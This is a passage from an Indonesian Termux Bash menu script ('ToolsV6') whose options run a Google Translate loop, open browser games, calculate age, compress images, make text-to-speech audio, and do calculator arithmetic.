echo ""
echo -e "${n}┌──────────────────────────┐"
echo -e "${n}|    ${y}GOOGLE TRANSLATE ${n}     |"
echo -e "${n}└──────────────────────────┘"
echo -e "${c}Hallo saya google translate di"
echo -e "${r}Kembangkan oleh By.Thxyzz404"
echo -e "${p}Ketik 'exit' untuk keluar"
echo -e "${g}"
while true; do
    read -p "➤ " masukan
    echo ""
    [[ "$masukan" == "exit" || "$masukan" == "keluar" ]] && { echo -e "${y}Sampai jumpa!"; break; }
    [[ -z "$masukan" ]] && continue
    target="id"
    teks="$masukan"
    if [[ "$masukan" =~ \ ([a-z]{2}(-[A-Z]+)?)$ ]]; then
        kode="${BASH_REMATCH[1]}"
        if [[ -n "${nama_bahasa[$kode]}" ]]; then
            target="$kode"
            teks="${masukan% $kode}"
        fi
    fi
    enc_teks=$(printf '%s' "$teks" | jq -s -R -r @uri)
    deteksi=$(curl -s "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=id&dt=t&q=$enc_teks" -A "Mozilla/5.0")
    dari=$(echo "$deteksi" | jq -r '.[2]' 2>/dev/null)
    [[ "$dari" == "null" || -z "$dari" ]] && dari="auto"
    terjemah "$teks" "$dari" "$target"
done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "2" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
 █████╗ ██╗       ██████╗  █████╗ ███╗   ███╗███████╗
██╔══██╗██║      ██╔════╝ ██╔══██╗████╗ ████║██╔════╝
███████║██║█████╗██║  ███╗███████║██╔████╔██║█████╗  
██╔══██║██║╚════╝██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  
██║  ██║███████╗ ╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗
╚═╝  ╚═╝╚══════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
" | lolcat 
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thxyzz404                ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}01 ${r}]${g} Game invaders                 ${b}║"
echo -e "║${r} [ ${y}02 ${r}]${g} Game dinosaurus               ${b}║"
echo -e "║${r} [ ${y}03 ${r}]${g} Game ninvaders                ${b}║"
echo -e "║${r} [ ${y}04 ${r}]${g} Game ular                     ${b}║"
echo -e "║${r} [ ${y}05 ${r}]${p} Keluar dari tools.            ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${y}Masukkan menu pilihan anda ${r}[ ${g}1\2\3\4\5 ${r}]${c} : ")" kon
case $kon in
1|01)
clear
echo "
⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀
⣤⣤⣼⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣤⣤⣤
⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⡇⠀⠀⣿⣿⣿
⠛⠛⠃⠀⠀⠘⠛⠛⣤⣤⣤⣤⣤⡀⠀⠀⢠⣤⣤⣤⣤⣤⠛⠛⠃⠀⠀⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀
" | lolcat
echo -e "${g}===============${r} GAME INVADERS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://invaders-eight.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME INVADERS URL LINK..!!"
echo ""
 ;;
2|02)
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡀⢠⣰⣶⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣾⣧⢷⠈⣧⡀⠀⠀⠀⠀⠀⣀⣀⣠⣼⣥⣤⣄⣀⣀⣻⡆⠀⠀⠀⠀⠀⣠⡶⠟⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠧⠋⠀⠀⠈⠀⠀⣠⣴⠶⠛⠋⠉⠉⠈⠀⠀⠉⠉⠉⠛⠛⠶⣤⣀⡴⠛⠉⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⡄⠀⠀⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣷⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠁⠙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡤⠤⠶⠶⠶⢶⡆⠀
⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⡀⠀⠀⠀⠀⠹⣧⠀⠀⠀⢀⣾⠃⠀
⠀⠀⠀⠀⢀⣿⡶⠶⣶⣗⠟⠛⠋⣿⣍⠉⢉⣭⣿⣯⡉⢉⣽⣶⣌⠉⢉⣽⡉⠉⠉⣿⡀⠀⠀⠀⠀⢹⡄⠀⠀⣼⠋⠀⠀
⢀⣠⣶⣿⡏⡿⠻⣦⣾⠙⠻⣶⣾⠋⠙⠷⠾⠋⠁⠙⢿⠟⠁⠈⠻⢷⠟⠙⢷⣶⠟⠿⡇⠀⠀⠀⠀⠈⣿⠀⣼⠇⠀⠀⠀
⠘⠿⣿⣿⢳⠇⠀⢈⣧⣤⡀⠀⠀⡀⠀⠀⠀⠄⠀⣠⣤⣄⠀⠀⠀⠀⠀⠀⠈⠀⠀⡆⡇⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⣀⠸⢿⡿⠇⠀⣸⠉⣰⣆⣸⣷⠈⠻⠿⠟⠀⡄⠀⠀⠀⠀⠀⠀⠀⡇⡏⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡇⠀⢿⠐⠇⠀⠀⠀⠙⠿⠋⠛⠛⠋⠀⠀⠀⠘⠂⠓⠀⠀⠀⠀⠀⠀⢀⢡⡇⠀⠀⠀⠀⠀⢸⣧⠤⠖⢲⡖⠀
⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣾⡇⠀⠀⠀⠀⠀⠸⣧⠀⠀⣼⠃⠀
⠀⠀⠀⠀⠘⢷⡄⠀⢠⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢀⡄⠀⣠⣄⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⢻⠀⢀⣿⠀⠀
⠀⠀⠀⠀⠀⠈⢻⣶⠿⣦⡿⣧⡀⣰⢷⣄⣀⡼⢦⣀⣼⠛⢷⣤⣾⠻⢷⣟⣙⣷⡿⠁⠀⠀⠀⠀⠀⠀⢻⡼⣇⢸⠇⠀⠀
⠀⠀⠀⠀⠀⠀⣽⣿⠷⠿⣧⣬⣿⣯⣤⣽⣯⠤⠤⠽⠵⠴⠶⠾⠟⠚⠛⠋⠉⠉⠀⠀⠀⠀⢀⠀⠀⠀⠸⣇⢿⡾⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⠀⠀⠀⢿⠘⢷⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣶⣤⣀⣀⣀⡀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣤⣤⣶⠆⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⣸⣆⠈⢻⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⡟⠛⠀⠀⡽⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠶⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠤⠤⠤⠴⠇
" | lolcat 
echo -e "${g}===============${r} GAME DINOSAURUS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://dino-beta-three.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME DINOSAURUS URL LINK..!!"
echo ""
  ;;
3|03)
clear 
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿
⣿⣿⡇⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⣿⣿⣿
⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
" | lolcat 
echo -e "${g}===============${r} GAME NINVADERS ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://ninvaders-kappa.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME NINVADERS URL LINK..!!"
echo ""
  ;;
4|04)
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢔⣫⣭⣭⣒⣒⠦⢤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢊⣵⣿⠿⠋⠀⠀⠉⠙⠓⣶⣬⣙⠲⢄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢊⣴⣿⠟⠁⠀⢀⡴⠶⣤⡀⠀⢈⠑⠊⠿⡆⠑⣄⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢞⣴⣿⠟⠁⠀⢀⣴⣏⣉⠓⠺⡇⠀⢸⣿⣷⣦⡄⠀⡸⠃
⠀⠀⠀⠀⠀⠀⢰⢃⣾⡿⠃⠀⠀⣴⠿⢤⣄⣈⠉⠓⢷⠀⠘⣿⣿⣿⣿⠞⠀⠀
⠀⠀⠀⠀⠀⠀⢸⢸⣿⡇⠀⠀⣼⠧⣤⣀⣀⡈⠉⢻⣟⡤⡀⠙⠟⣹⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡄⢻⣧⠀⠀⣿⡀⠀⠀⠈⠉⠉⣿⡜⠀⠈⠒⠚⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⡄⢻⣦⠀⠸⣏⠉⠉⠙⠛⠛⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢻⣆⠀⠹⣤⠤⠤⠤⠤⣿⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⢻⣧⠀⢻⡄⠀⠀⠀⣻⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⢻⣧⠀⢻⡉⠉⠉⠙⣏⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⢻⣧⠈⢷⡤⠤⠶⢿⣴⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⢻⣧⠈⣧⣀⣀⣼⣇⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⢻⣆⠘⣧⠀⣀⣹⡽⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢿⣆⠘⣏⠁⣈⣷⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠈⣎⢿⡆⠹⡏⢁⣹⡾⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⠔⣉⠠⣬⣑⠢⡀⠀⠀⠀⠘⡜⣿⡀⢻⡉⣈⣧⠇⠀⠀⠀⠀⠀
⠀⠀⠀⡠⢊⣴⠞⠉⢷⣝⢿⣷⣬⡢⣄⠀⠀⢇⢹⣧⠘⣏⣁⣽⡼⢀⠀⠀⠀⠀
⠀⢀⠊⠰⣿⡁⠀⡴⠋⠙⣶⣝⠻⣿⣮⣑⢄⣸⢸⣿⠀⣿⣡⢼⢇⣶⣍⡢⣄⠀
⠀⣀⠇⣀⡀⠉⠛⠦⣤⣞⠀⣸⠛⢳⠾⠿⣧⠉⣼⣿⠀⣿⢤⡾⠘⠛⣛⣡⣎⢢
⢎⣀⠘⠛⠿⢷⣦⣄⡠⢭⣙⡛⠲⠾⠖⠚⣁⣼⣿⢏⣼⣧⠞⣡⣿⣿⣿⣿⠟⡸
⠀⠀⠈⠉⠒⠒⠠⠬⠭⠅⢀⣉⣉⣙⣛⣛⣛⣉⠀⠬⠭⠤⠬⠭⠭⠭⠍⠒⠉⠀
" | lolcat
echo -e "${g}===============${r} GAME ULAR ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://ular-seven.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA GAME ULAR URL LINK..!!"
echo ""
  ;;
5|05)
clear 
echo ""
echo -e "${g} Keluar dari tools..!!"
echo ""
;;
*)
clear 
echo ""
echo -e "${c} Pilihan Anda Tidak Valid..!!"
echo ""
;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "3" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
echo "
 ▗▄▄▖▗▄▄▄▖▗▖ ▗▖    ▗▖ ▗▖▗▖  ▗▖▗▖ ▗▖▗▄▄▖ 
▐▌   ▐▌   ▐▌▗▞▘    ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌▐▌ ▐▌
▐▌   ▐▛▀▀▘▐▛▚▖     ▐▌ ▐▌▐▌  ▐▌▐▌ ▐▌▐▛▀▚▖
▝▚▄▄▖▐▙▄▄▖▐▌ ▐▌    ▝▚▄▞▘▐▌  ▐▌▝▚▄▞▘▐▌ ▐▌
" | lolcat            
echo -e "${g}===============${r} Cek Umur Seseorang ${g}==============="
echo -e "${c}"
read -p "Masukkan tahun lahir seseorang : " tahun_lahir
echo ""
if ! [[ "$tahun_lahir" =~ ^[0-9]{4}$ ]]; then
    echo -e "${r}Pilihan anda tidak valid harus 4 digit..!!"
fi
tahun_sekarang=$(date +%Y)
umur=$((tahun_sekarang - tahun_lahir))
if (( umur < 0 )); then
    echo -e "${b}Tahun tidak ada blum menuju ke masa depan..!!"
    echo ""
elif (( umur == 0 )); then
    echo -e "${p}Anda baru lahir umur anda skrng ${y}: ${r}0 tahun."
    echo ""
else
    echo -e "${y}Umur Anda sekarang adalah ${c}: ${g}$umur tahun."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "4" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
SAVE_DIR="/sdcard/KOMPRES_IMAGE"
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
if ! command -v magick &> /dev/null; then
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} magick belum terinstall, sedang menginstall..!!"
    sleep 2 
    echo -e "${n}"
    pkg install imagemagick -y
else
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} magick sudah terinstall."
    sleep 2 
fi
if command -v magick &> /dev/null; then
  CMD="magick convert"
elif command -v convert &> /dev/null; then
  CMD="convert"
else
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} silahkan install convert."
    echo ""
fi
clear 
echo "
░█▀▀░█▄█░█▀█░█▀▄░█▀▀
░█░░░█░█░█▀▀░█▀▄░▀▀█
░▀▀▀░▀░▀░▀░░░▀░▀░▀▀▀ " | lolcat 
echo -e "${g}"
read -p "Masukkan path foto : " path
echo ""
if [ ! -f "$path" ]; then
    clear 
    echo ""
    echo -e "${r}File tidak ditemukan."
    echo ""
fi
if command -v stat &> /dev/null; then
  size=$(stat -c%s "$path" 2>/dev/null || stat -f%z "$path" 2>/dev/null)
else
  size=$(wc -c < "$path" | tr -d ' ')
fi
if [ -z "$size" ]; then
    clear 
    echo ""
    echo -e "${r}Gagall membaca ukuran file."
    echo ""
fi
kb=$(awk "BEGIN {printf \"%.2f\", $size / 1024}")
echo -e "${r}[ ${g}+ ${r}]${y} Ukuran asli : ${kb} KB"
echo -e "${c}"
read -p "Target ukuran (kb) : " ukuran
echo ""
bytes=$(awk "BEGIN {print int($ukuran * 1024)}")
mkdir -p "$SAVE_DIR"
file=$(basename "$path")
name="${file%.*}"
ext="${file##*.}"
for quality in 50 40 30 25 20 15 10 8 5 3 2 1; do
  output="$SAVE_DIR/${name}_q${quality}.${ext}"
  $CMD "$path" -quality $quality "$output" 2>/dev/null 
if [ ! -f "$output" ]; then
   continue
fi    
if command -v stat &> /dev/null; then
   size=$(stat -c%s "$output" 2>/dev/null || stat -f%z "$output" 2>/dev/null)
else
   size=$(wc -c < "$output" | tr -d ' ')
fi
if [ -z "$size" ]; then
    continue
fi   
kb=$(awk "BEGIN {printf \"%.2f\", $size / 1024}")
echo -e "${r}[ ${g}+ ${r}]${y} Kualitas : $quality% -> ${kb} KB"
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Sukses : $quality% -> ${kb} KB"
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} File di : $output"
echo ""
done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "5" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
if ! command -v python &> /dev/null; then
    clear
    echo ""
    echo -e "${c}Python belum terinstall. Menginstall...!!"
    echo -e "${n}"
    pkg install -y python
fi
if ! command -v pip &> /dev/null; then
    clear 
    echo ""
    echo -e "${c}Pip belum terinstall. Menginstall...!!"
    echo -e "${n}"
    pkg install -y python-pip
fi
if ! command -v gtts-cli &> /dev/null; then
    clear 
    echo ""
    echo -e "${c}gTTS belum terinstall. Menginstall...!!"
    pip install gTTS
    clear
fi
echo "
███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗
███████╗██║   ██║██║   ██║██╔██╗ ██║██║  ██║
╚════██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
███████║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝
       Development : Thxyzz404" | lolcat
echo -e "${g}"
read -p "Masukkan teks yang ingin menjadi sound : " teks
echo "$teks" > teks.txt
gtts-cli -f teks.txt -l id -o /sdcard/Download/Google.mp3
rm teks.txt
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "6" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
while true; do
clear 
echo "
██╗  ██╗ █████╗ ██╗     ██╗   ██╗
██║ ██╔╝██╔══██╗██║     ██║   ██║
█████╔╝ ███████║██║     ██║   ██║
██╔═██╗ ██╔══██║██║     ██║   ██║
██║  ██╗██║  ██║███████╗╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝" | lolcat
echo ""
echo -e "${r}[ ${g}01 ${r}]${c} Penjumlahan"
echo -e "${r}[ ${g}02 ${r}]${c} Pengurangan"
echo -e "${r}[ ${g}03 ${r}]${c} Perkalian"
echo -e "${r}[ ${g}04 ${r}]${c} Pembagian"
echo -e "${r}[ ${g}05 ${r}]${c} Pangkat"
echo -e "${r}[ ${g}06 ${r}]${c} Akar Kuadrat"
echo -e "${r}[ ${g}07 ${r}]${c} Persen"
echo -e "${r}[ ${g}08 ${r}]${c} Ekspresi Bebas (pakai + - * / ^ dst)"
echo -e "${r}[ ${g}00 ${r}]${y} Keluar"
echo -e "${g}"
read -p "Pilih menu kalkulator [0-8] : " pilih
case $pilih in
1|01)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a + b))"
        ;;
2|02)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a - b))"
        ;;
3|03)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a * b))"
        ;;
4|04)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a / b))"
        ;;
5|05)
        echo -e "${p}"
        read -p "Masukkan angka : " a
        echo -e "${b}"
        read -p "Dipangkatkan berapa : " b
        echo ""
        echo -e "${c}Hasil : $(echo "$a ^ $b" | bc)"
        ;;
6|06)
        echo -e "${p}"
        read -p "Masukkan angka : " a
        echo ""
        echo -e "${c}Hasil akar kuadrat : $(echo "scale=4; sqrt($a)" | bc)"
        ;;
7|07)
        echo -e "${p}"
        read -p "Masukkan nilai (misal: 30) : " a
        echo -e "${b}"
        read -p "Persen berapa (misal: 15) : " b
        echo ""
        echo -e "${c}$b% dari $a adalah : $(echo "scale=2; $a * $b / 100" | bc)"
        ;;
8|08)
        echo -e "${p}"
        read -p "Masukkan ekspresi matematika (contoh: 5+3*2^2) : " ekspresi
        hasil=$(echo "scale=4; $ekspresi" | sed 's/\^/**/g' | bc -l 2>/dev/null)
        echo ""
        echo -e "${c}Hasil : $hasil"
        ;;
0|00)
        clear 
        echo ""
        echo -e "${r}Keluar dari kalkulator."
        sleep 3 
        echo ""
        break
        ;;
      *)
        clear 
        echo ""
        echo -e "${y}Pilihan tidak valid!"
        sleep 3 
        echo ""
        salah
        ;;
    esac
    echo -e "${y}"
    read -p "Tekan ENTER untuk kembali ke menu..!!"
  done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "7" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
cd $HOME
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
command -v tmux >/dev/null 2>&1 || {
    clear
    echo ""
